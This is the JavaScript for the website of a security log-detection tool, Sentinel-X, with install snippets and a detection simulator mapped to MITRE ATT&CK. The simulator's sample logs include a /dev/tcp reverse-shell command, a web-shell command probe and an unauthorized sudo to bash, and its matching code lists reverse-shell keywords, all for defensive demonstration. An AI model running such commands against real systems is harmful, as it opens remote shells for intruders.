/* ==========================================================================
   Sentinel-X Official Website — Interactive Logic (public/app.js)
   1. Quick-Start Terminal Tab Switcher & Clipboard Copy
   2. Real-time Log Normalization & Official MITRE ATT&CK Detection Simulator
   3. Live Release & Patch Metadata Loader (/version.json)
   ========================================================================== */

(function () {
  "use strict";

  const TERMINAL_SNIPPETS = {
    windows_exe: [
      "# 1. ดึงโค้ดหรืออัปเดต Patch พร้อมรับไฟล์ dist\\sentinel-x.exe ที่คอมไพล์เสร็จแล้ว",
      "git clone https://github.com/lastmy2557-png/Sentinel-X.git",
      "cd Sentinel-X",
      "scripts\\apply_patch_windows.bat",
      "",
      "# 2. เปิดใช้งาน SOC Dashboard (/) และหน้าตั้งค่า API บริการภายนอก (/settings)",
      "dist\\sentinel-x.exe serve --host 127.0.0.1 --port 8080"
    ].join("\n"),
    python_cli: [
      "# 1. รันชุดทดสอบทั้งหมดและตรวจสอบความปลอดภัย Anti-REA",
      "python3 -m unittest discover -s tests -p \"test_*.py\" -v",
      "python3 -m sentinel_x.security.release_protection.cli audit --root . --format markdown",
      "",
      "# 2. Ingest ข้อมูล Log และเปิดใช้งาน Local-first Security Dashboard",
      "python3 -m sentinel_x.cli ingest --file data/samples/sample_security.log --sample",
      "python3 -m sentinel_x.cli serve --host 127.0.0.1 --port 8080"
    ].join("\n"),
    docker_ghcr: [
      "# ดึง Container Image แบบ Non-root จาก GitHub Packages (ghcr.io)",
      "docker pull ghcr.io/lastmy2557-png/sentinel-x:latest",
      "",
      "# รัน Sentinel-X SOC Dashboard & API Server บนพอร์ต 8080",
      "docker run --rm -p 127.0.0.1:8080:8080 ghcr.io/lastmy2557-png/sentinel-x:latest"
    ].join("\n"),
    anti_rea: [
      "# สร้างกุญแจ Ed25519 ไว้นอก Repository และลงนาม Signed Release Manifest",
      "python3 -m sentinel_x.security.release_protection.cli keygen \\",
      "  --private-key /tmp/release.key --public-key /tmp/release_public.pem",
      "",
      "python3 -m sentinel_x.security.release_protection.cli sign \\",
      "  --root . --private-key /tmp/release.key --output /tmp/release_manifest.json",
      "",
      "python3 -m sentinel_x.security.release_protection.cli verify \\",
      "  --root . --manifest /tmp/release_manifest.json --public-key /tmp/release_public.pem"
    ].join("\n")
  };

  const SCENARIOS = {
    ssh_bruteforce: {
      raw: "2026-11-07T10:15:04Z sshd[2140]: Failed password for invalid user admin from 203.0.113.55 port 51234 ssh2",
      normalized: {
        timestamp: "2026-11-07T10:15:04+00:00",
        source_type: "linux_auth",
        category: "AUTHENTICATION",
        severity: "HIGH",
        source_ip: "203.0.113.55",
        user: "admin",
        action: "ssh_login_failed",
        outcome: "FAILURE",
        message: "Failed password for invalid user admin from 203.0.113.55 port 51234 ssh2"
      },
      alert: {
        rule_id: "SX-RULE-001",
        title: "SSH Brute Force / Repeated Authentication Failure",
        severity: "HIGH",
        mitre_technique_id: "T1110.001",
        mitre_technique_name: "Password Guessing",
        mitre_tactic: "Credential Access",
        explanation: "Detected repeated SSH authentication failures from source_ip=203.0.113.55 targeting user=admin within the 300s correlation window."
      }
    },
    sudo_escalation: {
      raw: "2026-11-07T10:18:22Z sudo: www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
      normalized: {
        timestamp: "2026-11-07T10:18:22+00:00",
        source_type: "linux_auth",
        category: "PRIVILEGE_ESCALATION",
        severity: "HIGH",
        source_ip: "127.0.0.1",
        user: "www-data",
        action: "sudo_unauthorized",
        outcome: "FAILURE",
        message: "www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"
      },
      alert: {
        rule_id: "SX-RULE-002",
        title: "Unauthorized Sudo Privilege Escalation Attempt",
        severity: "HIGH",
        mitre_technique_id: "T1548.003",
        mitre_technique_name: "Sudo and Sudo Caching",
        mitre_tactic: "Privilege Escalation",
        explanation: "Service account 'www-data' attempted unauthorized sudo execution of '/bin/bash' as root."
      }
    },
    webshell_upload: {
      raw: "198.51.100.77 - - [07/Nov/2026:10:21:09 +0000] \"POST /uploads/cmd_shell.jsp?cmd=whoami HTTP/1.1\" 200 1420",
      normalized: {
        timestamp: "2026-11-07T10:21:09+00:00",
        source_type: "web_access",
        category: "WEB_ATTACK",
        severity: "CRITICAL",
        source_ip: "198.51.100.77",
        user: "-",
        action: "http_post_suspicious_script",
        outcome: "SUCCESS",
        message: "POST /uploads/cmd_shell.jsp?cmd=whoami HTTP/1.1 (status 200)"
      },
      alert: {
        rule_id: "SX-SIGMA-001",
        title: "Web Shell Upload or Command Execution Detected",
        severity: "CRITICAL",
        mitre_technique_id: "T1505.003",
        mitre_technique_name: "Web Shell",
        mitre_tactic: "Persistence",
        explanation: "HTTP POST request to executable script path '/uploads/cmd_shell.jsp?cmd=whoami' from 198.51.100.77 returned HTTP 200."
      }
    },
    reverse_shell: {
      raw: "{\"timestamp\":\"2026-11-07T10:25:00Z\",\"category\":\"PROCESS_EXECUTION\",\"user\":\"ubuntu\",\"source_ip\":\"10.10.14.9\",\"command\":\"bash -i >& /dev/tcp/198.51.100.99/4444 0>&1\"}",
      normalized: {
        timestamp: "2026-11-07T10:25:00+00:00",
        source_type: "json_event",
        category: "PROCESS_EXECUTION",
        severity: "CRITICAL",
        source_ip: "10.10.14.9",
        user: "ubuntu",
        action: "process_spawn",
        outcome: "OBSERVED",
        message: "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1"
      },
      alert: {
        rule_id: "SX-RULE-004",
        title: "Suspicious Interactive Reverse Shell Command",
        severity: "CRITICAL",
        mitre_technique_id: "T1059.004",
        mitre_technique_name: "Unix Shell",
        mitre_tactic: "Execution",
        explanation: "Process execution contains interactive /dev/tcp reverse shell redirection to remote host 198.51.100.99:4444."
      }
    }
  };

  function evaluateCustomLog(rawText) {
    const text = (rawText || "").trim();
    const lower = text.toLowerCase();
    const ipMatch = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    const extractedIp = ipMatch ? ipMatch[0] : "127.0.0.1";
    const nowIso = new Date().toISOString();

    if (lower.includes("failed password") || lower.includes("authentication failure")) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "custom_input",
          category: "AUTHENTICATION",
          severity: "HIGH",
          source_ip: extractedIp,
          action: "auth_failure",
          outcome: "FAILURE",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-001",
          title: "Authentication Brute Force / Password Guessing Indicator",
          severity: "HIGH",
          mitre_technique_id: "T1110.001",
          mitre_technique_name: "Password Guessing",
          mitre_tactic: "Credential Access",
          explanation: "Matched authentication failure pattern from source_ip=" + extractedIp
        }
      };
    }

    if (lower.includes("sudo") && (lower.includes("not in sudoers") || lower.includes("command="))) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "custom_input",
          category: "PRIVILEGE_ESCALATION",
          severity: "HIGH",
          source_ip: extractedIp,
          action: "sudo_invocation",
          outcome: "FAILURE",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-002",
          title: "Suspicious Sudo Privilege Escalation",
          severity: "HIGH",
          mitre_technique_id: "T1548.003",
          mitre_technique_name: "Sudo and Sudo Caching",
          mitre_tactic: "Privilege Escalation",
          explanation: "Matched unauthorized sudoers or privileged command escalation pattern."
        }
      };
    }

    if (lower.includes(".jsp") || lower.includes(".php") || lower.includes("cmd=") || lower.includes("webshell")) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "custom_input",
          category: "WEB_ATTACK",
          severity: "CRITICAL",
          source_ip: extractedIp,
          action: "web_script_probe",
          outcome: "OBSERVED",
          message: text
        },
        alert: {
          rule_id: "SX-SIGMA-001",
          title: "Web Shell or Remote Command Probe Detected",
          severity: "CRITICAL",
          mitre_technique_id: "T1505.003",
          mitre_technique_name: "Web Shell",
          mitre_tactic: "Persistence",
          explanation: "Matched web shell script extension or remote command parameter in HTTP request."
        }
      };
    }

    if (lower.includes("/dev/tcp/") || lower.includes("nc -e") || lower.includes("bash -i")) {
      return {
        normalized: {
          timestamp: nowIso,
          source_type: "custom_input",
          category: "PROCESS_EXECUTION",
          severity: "CRITICAL",
          source_ip: extractedIp,
          action: "reverse_shell_spawn",
          outcome: "OBSERVED",
          message: text
        },
        alert: {
          rule_id: "SX-RULE-004",
          title: "Reverse Shell Execution Pattern",
          severity: "CRITICAL",
          mitre_technique_id: "T1059.004",
          mitre_technique_name: "Unix Shell",
          mitre_tactic: "Execution",
          explanation: "Matched interactive shell socket redirection pattern."
        }
      };
    }

    return {
      normalized: {
        timestamp: nowIso,
        source_type: "custom_input",
        category: "GENERAL_TELEMETRY",
        severity: "INFO",
        source_ip: extractedIp,
        action: "log_ingested",
        outcome: "NORMALIZED",
        message: text
      },
      alert: {
        rule_id: "NONE",
        title: "No Threat Signature Triggered (Benign / Informational Event)",
        severity: "INFO",
        mitre_technique_id: "N/A",
        mitre_technique_name: "No MITRE ATT&CK Match",
        mitre_tactic: "None",
        explanation: "Event was normalized into UTC ISO-8601 schema and stored without triggering high-risk detection rules."
      }
    };
  }

  function renderSimulationResult(result) {
    const normPre = document.getElementById("sim-normalized-output");
    const alertPre = document.getElementById("sim-alert-output");
    const sevBadge = document.getElementById("sim-severity-badge");

    if (normPre) {
      normPre.textContent = JSON.stringify(result.normalized, null, 2);
    }
    if (alertPre) {
      alertPre.textContent = JSON.stringify(result.alert, null, 2);
    }
    if (sevBadge) {
      const sev = result.alert.severity || "INFO";
      sevBadge.textContent = sev + (result.alert.mitre_technique_id !== "N/A" ? " · " + result.alert.mitre_technique_id : "");
      sevBadge.className = "severity-pill sev-" + sev;
    }
  }

  function initTerminalTabs() {
    const tabs = document.querySelectorAll(".term-tab");
    const codeEl = document.getElementById("hero-terminal-code");
    const copyBtn = document.getElementById("btn-copy-terminal");

    tabs.forEach(function (tab) {
      tab.addEventListener("click", function () {
        tabs.forEach(function (t) {
          t.classList.remove("active");
        });
        tab.classList.add("active");
        const key = tab.getAttribute("data-tab");
        if (codeEl && TERMINAL_SNIPPETS[key]) {
          codeEl.textContent = TERMINAL_SNIPPETS[key];
        }
      });
    });

    if (copyBtn && codeEl) {
      copyBtn.addEventListener("click", function () {
        const text = codeEl.textContent || "";
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(text).then(function () {
            const orig = copyBtn.textContent;
            copyBtn.textContent = "คัดลอกคำสั่งแล้ว (Copied)";
            setTimeout(function () {
              copyBtn.textContent = orig;
            }, 1800);
          });
        }
      });
    }
  }

  function initSimulator() {
    const scenarioBtns = document.querySelectorAll(".scenario-btn");
    const inputEl = document.getElementById("sim-raw-input");
    const runBtn = document.getElementById("btn-run-simulation");

    scenarioBtns.forEach(function (btn) {
      btn.addEventListener("click", function () {
        scenarioBtns.forEach(function (b) {
          b.classList.remove("active");
        });
        btn.classList.add("active");
        const key = btn.getAttribute("data-scenario");
        const item = SCENARIOS[key];
        if (item && inputEl) {
          inputEl.value = item.raw;
          renderSimulationResult(item);
        }
      });
    });

    if (runBtn && inputEl) {
      runBtn.addEventListener("click", function () {
        renderSimulationResult(evaluateCustomLog(inputEl.value));
      });
    }

    // Load default scenario on startup
    if (inputEl && SCENARIOS.ssh_bruteforce) {
      inputEl.value = SCENARIOS.ssh_bruteforce.raw;
      renderSimulationResult(SCENARIOS.ssh_bruteforce);
    }
  }

  function loadLiveVersionMetadata() {
    fetch("/version.json")
      .then(function (res) {
        if (!res.ok) throw new Error("Failed to load version.json");
        return res.json();
      })
      .then(function (data) {
        const verNodes = document.querySelectorAll("[data-live-version]");
        verNodes.forEach(function (node) {
          node.textContent = "v" + data.version;
        });
        const exeHashNode = document.getElementById("live-exe-sha256");
        if (exeHashNode && data.exe_sha256) {
          exeHashNode.textContent = data.exe_sha256;
        }
        const relExeHash = document.getElementById("release-exe-sha256");
        if (relExeHash && data.exe_sha256) {
          relExeHash.textContent = "SHA-256: " + data.exe_sha256;
        }
        const relPatchHash = document.getElementById("release-patch-sha256");
        if (relPatchHash && data.patch_sha256) {
          relPatchHash.textContent = "SHA-256 (" + data.patch_file + "): " + data.patch_sha256;
        }
      })
      .catch(function () {
        // Fallback already rendered in static HTML
      });
  }

  document.addEventListener("DOMContentLoaded", function () {
    initTerminalTabs();
    initSimulator();
    loadLiveVersionMetadata();
  });
})();
